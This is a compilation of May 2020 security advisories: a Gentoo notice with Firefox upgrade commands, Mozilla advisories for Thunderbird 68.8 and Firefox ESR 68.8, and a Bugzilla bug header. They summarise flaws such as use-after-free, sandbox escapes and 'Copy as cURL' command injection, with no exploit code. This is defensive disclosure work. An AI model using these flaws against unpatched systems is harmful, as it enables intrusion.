=== Content from security.gentoo.org_cde19d5a_20250119_122716.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Mozilla Firefox: Multiple vulnerabilities — GLSA **202005-04**

Multiple vulnerabilities have been found in Mozilla Firefox, the
worst of which could result in the arbitrary execution of code.

### Affected packages

| Package | **www-client/firefox** on all architectures |
| --- | --- |
| Affected versions | < **68.8.0** |
| Unaffected versions | >= **68.8.0** |

| Package | **www-client/firefox-bin** on all architectures |
| --- | --- |
| Affected versions | < **68.8.0** |
| Unaffected versions | >= **68.8.0** |

### Background

Mozilla Firefox is a popular open-source web browser from the Mozilla
Project.

### Description

Multiple vulnerabilities have been discovered in Mozilla Firefox. Please
review the CVE identifiers referenced below for details.

### Impact

A remote attacker could entice a user to view a specially crafted web
page, possibly resulting in the execution of arbitrary code with the
privileges of the process, an information leak or a Denial of Service
condition.

### Workaround

There is no known workaround at this time.

### Resolution

All Mozilla Firefox users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-68.8.0"

```

All Mozilla Firefox binary users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-bin-68.8.0"

```
### References

* [CVE-2020-12387](https://nvd.nist.gov/vuln/detail/CVE-2020-12387)
* [CVE-2020-12392](https://nvd.nist.gov/vuln/detail/CVE-2020-12392)
* [CVE-2020-12394](https://nvd.nist.gov/vuln/detail/CVE-2020-12394)
* [CVE-2020-12395](https://nvd.nist.gov/vuln/detail/CVE-2020-12395)
* [CVE-2020-12396](https://nvd.nist.gov/vuln/detail/CVE-2020-12396)
* [CVE-2020-6831](https://nvd.nist.gov/vuln/detail/CVE-2020-6831)
* [MFSA-2020-17](https://www.mozilla.org/en-US/security/advisories/mfsa2020-17/)

**Release date**

May 12, 2020

**Latest revision**

May 12, 2020: 1

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [721090](https://bugs.gentoo.org/show_bug.cgi?id=721090)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from www.mozilla.org_e13827cb_20250119_122717.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2020-18

## Security Vulnerabilities fixed in Thunderbird 68.8.0

Announced
May 5, 2020
Impact
critical
Products
Thunderbird
Fixed in

* Thunderbird 68.8

*In general, these flaws cannot be exploited through email in the Thunderbird product because scripting is disabled when reading mail, but are potentially risks in browser or browser-like contexts.*

#### [#CVE-2020-12397: Sender Email Address Spoofing using encoded Unicode characters](#CVE-2020-12397)

Reporter
Ahmed Elsobky (@0xSobky)
Impact
low
##### Description

By encoding Unicode whitespace characters within the From
email header, an attacker can spoof the sender email address
that Thunderbird displays.

##### References

* [Bug 1617370](https://bugzilla.mozilla.org/show_bug.cgi?id=1617370)

#### [#CVE-2020-12387: Use-after-free during worker shutdown](#CVE-2020-12387)

Reporter
Looben Yang
Impact
critical
##### Description

A race condition when running shutdown code for Web Worker led to a use-after-free vulnerability. This resulted in a potentially exploitable crash.

##### References

* [Bug 1545345](https://bugzilla.mozilla.org/show_bug.cgi?id=1545345)

#### [#CVE-2020-6831: Buffer overflow in SCTP chunk input validation](#CVE-2020-6831)

Reporter
Natalie Silvanovich of Google Project Zero
Impact
high
##### Description

A buffer overflow could occur when parsing and validating SCTP chunks in WebRTC. This could have led to memory corruption and a potentially exploitable crash.

##### References

* [Bug 1632241](https://bugzilla.mozilla.org/show_bug.cgi?id=1632241)

#### [#CVE-2020-12392: Arbitrary local file access with 'Copy as cURL'](#CVE-2020-12392)

Reporter
Ophir LOJKINE
Impact
moderate
##### Description

The 'Copy as cURL' feature of Devtools' network tab did not properly escape the HTTP POST data of a request, which can be controlled by the website. If a user used the 'Copy as cURL' feature and pasted the command into a terminal, it could have resulted in the disclosure of local files.

##### References

* [Bug 1614468](https://bugzilla.mozilla.org/show_bug.cgi?id=1614468)

#### [#CVE-2020-12393: Devtools' 'Copy as cURL' feature did not fully escape website-controlled data, potentially leading to command injection](#CVE-2020-12393)

Reporter
David Yesland
Impact
moderate
##### Description

The 'Copy as cURL' feature of Devtools' network tab did not properly escape the HTTP method of a request, which can be controlled by the website. If a user used the 'Copy as cURL' feature and pasted the command into a terminal, it could have resulted in command injection and arbitrary command execution.
*Note: this issue only affects Firefox on Windows operating systems.*

##### References

* [Bug 1615471](https://bugzilla.mozilla.org/show_bug.cgi?id=1615471)

#### [#CVE-2020-12395: Memory safety bugs fixed in Thunderbird 68.8.0](#CVE-2020-12395)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Alexandru Michis, Jason Kratzer, philipp, Ted Campbell, Bas Schouten, André Bargull, and Karl Tomlinson reported memory safety bugs present in Firefox 75 and Firefox ESR 68.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Thunderbird 68.8.0](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1595886%2C1611482%2C1614704%2C1624098%2C1625749%2C1626382%2C1628076%2C1631508)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from www.mozilla.org_a00a6259_20250119_122717.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2020-17

## Security Vulnerabilities fixed in Firefox ESR 68.8

Announced
May 5, 2020
Impact
critical
Products
Firefox ESR
Fixed in

* Firefox ESR 68.8

#### [#CVE-2020-12387: Use-after-free during worker shutdown](#CVE-2020-12387)

Reporter
Looben Yang
Impact
critical
##### Description

A race condition when running shutdown code for Web Worker led to a use-after-free vulnerability. This resulted in a potentially exploitable crash.

##### References

* [Bug 1545345](https://bugzilla.mozilla.org/show_bug.cgi?id=1545345)

#### [#CVE-2020-12388: Sandbox escape with improperly guarded Access Tokens](#CVE-2020-12388)

Reporter
James Forshaw of Google Project Zero
Impact
critical
##### Description

The Firefox content processes did not sufficiently lockdown access control which could result in a sandbox escape.
*Note: this issue only affects Firefox on Windows operating systems.*

##### References

* [Bug 1618911](https://bugzilla.mozilla.org/show_bug.cgi?id=1618911)

#### [#CVE-2020-12389: Sandbox escape with improperly separated process types](#CVE-2020-12389)

Reporter
Niklas Baumstark
Impact
high
##### Description

The Firefox content processes did not sufficiently lockdown access control which could result in a sandbox escape.
*Note: this issue only affects Firefox on Windows operating systems.*

##### References

* [Bug 1554110](https://bugzilla.mozilla.org/show_bug.cgi?id=1554110)

#### [#CVE-2020-6831: Buffer overflow in SCTP chunk input validation](#CVE-2020-6831)

Reporter
Natalie Silvanovich of Google Project Zero
Impact
high
##### Description

A buffer overflow could occur when parsing and validating SCTP chunks in WebRTC. This could have led to memory corruption and a potentially exploitable crash.

##### References

* [Bug 1632241](https://bugzilla.mozilla.org/show_bug.cgi?id=1632241)

#### [#CVE-2020-12392: Arbitrary local file access with 'Copy as cURL'](#CVE-2020-12392)

Reporter
Ophir LOJKINE
Impact
moderate
##### Description

The 'Copy as cURL' feature of Devtools' network tab did not properly escape the HTTP POST data of a request, which can be controlled by the website. If a user used the 'Copy as cURL' feature and pasted the command into a terminal, it could have resulted in the disclosure of local files.

##### References

* [Bug 1614468](https://bugzilla.mozilla.org/show_bug.cgi?id=1614468)

#### [#CVE-2020-12393: Devtools' 'Copy as cURL' feature did not fully escape website-controlled data, potentially leading to command injection](#CVE-2020-12393)

Reporter
David Yesland
Impact
moderate
##### Description

The 'Copy as cURL' feature of Devtools' network tab did not properly escape the HTTP method of a request, which can be controlled by the website. If a user used the 'Copy as cURL' feature and pasted the command into a terminal, it could have resulted in command injection and arbitrary command execution.
*Note: this issue only affects Firefox on Windows operating systems.*

##### References

* [Bug 1615471](https://bugzilla.mozilla.org/show_bug.cgi?id=1615471)

#### [#CVE-2020-12395: Memory safety bugs fixed in Firefox 76 and Firefox ESR 68.8](#CVE-2020-12395)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Alexandru Michis, Jason Kratzer, philipp, Ted Campbell, Bas Schouten, André Bargull, and Karl Tomlinson reported memory safety bugs present in Firefox 75 and Firefox ESR 68.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 76 and Firefox ESR 68.8](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1595886%2C1611482%2C1614704%2C1624098%2C1625749%2C1626382%2C1628076%2C1631508)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_56a175c8_20250119_122715.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1545345)
* [XML](/show_bug.cgi?ctype=xml&id=1545345)

Closed
[Bug 1545345](/show_bug.cgi?id=1545345)
(CVE-2020-12387)

Opened 6 years ago
Closed 5 years ago

# Web Workers - Use After Free with XMLHttpRequest

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Web Workers - Use After Free with XMLHttpRequest

## Categories

### (Core :: DOM: Workers, defect, P1)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=DOM%3A%20Workers#DOM%3A%20Workers)

DOM: Workers
▾

Core :: DOM: Workers
This component covers the [Web Workers](https://developer.mozilla.org/En/DOM/Worker) implementation in Gecko.
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Workers&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Workers&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=DOM%3A%20Workers)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

68 Branch

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P1

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

critical

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

mozilla76

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Accessibility Severity | --- |
| --- | --- |
| Performance Impact | --- |
| Webcompat Priority | --- |
| a11y-review | --- |
| Webcompat Score | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr68 | [76+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=76%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed) |
| firefox68 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox68&o1=equals&v1=wontfix) |
| firefox69 | [+](/buglist.cgi?f1=cf_tracking_firefox69&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=wontfix) |
| firefox70 | [+](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=wontfix) |
| firefox71 | [+](/buglist.cgi?f1=cf_tracking_firefox71&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=wontfix) |
| firefox72 | [+](/buglist.cgi?f1=cf_tracking_firefox72&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=wontfix) |
| firefox73 | [+](/buglist.cgi?f1=cf_tracking_firefox73&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=wontfix) |
| firefox74 | [+](/buglist.cgi?f1=cf_tracking_firefox74&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox74&o1=equals&v1=wontfix) |
| firefox75 | [+](/buglist.cgi?f1=cf_tracking_firefox75&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox75&o1=equals&v1=wontfix) |
| firefox76 | [+](/buglist.cgi?f1=cf_tracking_firefox76&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox76&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr68 | 76+ | fixed |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox68 |  | wontfix |
| firefox69 | + | wontfix |
| firefox70 | + | wontfix |
| firefox71 | + | wontfix |
| firefox72 | + | wontfix |
| firefox73 | + | wontfix |
| firefox74 | + | wontfix |
| firefox75 | + | wontfix |
| firefox76 | + | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

